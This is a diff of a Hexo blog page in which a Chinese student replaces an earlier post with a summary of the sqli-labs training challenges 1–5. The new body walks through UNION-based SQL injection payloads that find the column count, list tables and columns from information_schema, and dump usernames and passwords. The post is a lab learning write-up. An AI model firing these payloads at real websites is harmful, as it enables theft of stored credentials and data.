@@ -20,27 +20,27 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="1、判断注入点2、判断是整型还是字符型3、判断查询列数4、判断显示位5、获取所有数据库名6、获取数据库所有表名7、获取字段名8、获取字段中的数据">
+<meta name="description" content="labs-sqli 1-5题小结（虽然感觉还没大懂）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs 初入">
-<meta property="og:url" content="http://example.com/2021/10/13/sqli-labs-%E5%88%9D%E5%85%A5/index.html">
+<meta property="og:title" content="labs-sqli 1-5">
+<meta property="og:url" content="http://example.com/2021/10/21/labs-sqli-1-5/index.html">
 <meta property="og:site_name" content="whhzt的博客">
-<meta property="og:description" content="1、判断注入点2、判断是整型还是字符型3、判断查询列数4、判断显示位5、获取所有数据库名6、获取数据库所有表名7、获取字段名8、获取字段中的数据">
+<meta property="og:description" content="labs-sqli 1-5题小结（虽然感觉还没大懂）">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-10-13T12:07:26.000Z">
-<meta property="article:modified_time" content="2021-10-13T12:10:03.144Z">
+<meta property="article:published_time" content="2021-10-21T15:38:14.000Z">
+<meta property="article:modified_time" content="2021-10-21T15:45:19.254Z">
 <meta property="article:author" content="我的博客">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2021/10/13/sqli-labs-%E5%88%9D%E5%85%A5/">
+<link rel="canonical" href="http://example.com/2021/10/21/labs-sqli-1-5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/10/13/sqli-labs-%E5%88%9D%E5%85%A5/","path":"2021/10/13/sqli-labs-初入/","title":"sqli-labs 初入"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/10/21/labs-sqli-1-5/","path":"2021/10/21/labs-sqli-1-5/","title":"labs-sqli 1-5"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sqli-labs 初入 | whhzt的博客</title>
+<title>labs-sqli 1-5 | whhzt的博客</title>
   
 
 
@@ -95,7 +95,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -108,6 +108,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">大体做题流程都是：</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -164,7 +165,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/13/sqli-labs-%E5%88%9D%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/21/labs-sqli-1-5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -177,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sqli-labs 初入
+          labs-sqli 1-5
         </h1>
 
         <div class="post-meta-container">
@@ -189,7 +190,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-10-13 20:07:26 / Modified: 20:10:03" itemprop="dateCreated datePublished" datetime="2021-10-13T20:07:26+08:00">2021-10-13</time>
+      <time title="Created: 2021-10-21 23:38:14 / Modified: 23:45:19" itemprop="dateCreated datePublished" datetime="2021-10-21T23:38:14+08:00">2021-10-21</time>
     </span>
 
   
@@ -202,10 +203,27 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>1、判断注入点<br><br>2、判断是整型还是字符型<br><br>3、判断查询列数<br><br>4、判断显示位<br><br>5、获取所有数据库名<br><br>6、获取数据库所有表名<br><br>7、获取字段名<br><br>8、获取字段中的数据</p>
+        <p>labs-sqli 1-5题小结（虽然感觉还没大懂）</p>
 <span id="more"></span>
-<p>information_schema库的schemata表保存了所有数据库的名称<br><br>schemata_name，tables表保存了所有的表名<br><br>table_name列对应数据库名table_scema<br><br>columns表保存了所有字段名<br><br>column_name列对应表名table_name和数据库名table_shcema</p>
-
+<hr>
+<h1>大体做题流程都是：</h1>
+<br>先判断是字符型还是数字型<br>
+<br>?id=1 <br>
+<br>/*只有输入错误的类型报错我们才知道注入是哪种*/<br>
+<br>确认字段位数<br>
+<br>?id=1 order by 3<br>
+<br>确认占位信息<br>
+<br>/*使用基于报错的union联合查询,所以我们把id=1改成-1（一个正常来说肯定不存在的值）那它就能回显出我们要爆的东西*/<br>
+<br>?id=-1 union select 1,2,3--+<br>
+<br>找库名<br>
+<br>?id=-1 union select 1,2,database() --+<br>
+<br>找表名<br>
+<br>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<br>
+<br>/*group_concat()函数将组中的字符串连接成为字符串(就可以一次多爆出点我们需要的东西)<br>
+<br>找字段名<br>
+<br>?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema='security' and table_name='users'--+<br>
+<br>找账号密码信息<br>
+<br>?id=-1 union select 1,2,group_concat(concat_ws(',',username,password) SEPARATOR '|') from users --+<br>
     </div>
 
     
@@ -235,14 +253,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/10/02/http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/" rel="prev" title="http请求方式">
-                  <i class="fa fa-chevron-left"></i> http请求方式
+                <a href="/2021/10/13/sqli-labs-%E5%88%9D%E5%85%A5/" rel="prev" title="sqli-labs 初入">
+                  <i class="fa fa-chevron-left"></i> sqli-labs 初入
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/10/21/labs-sqli-1-5/" rel="next" title="labs-sqli 1-5">
-                  labs-sqli 1-5 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
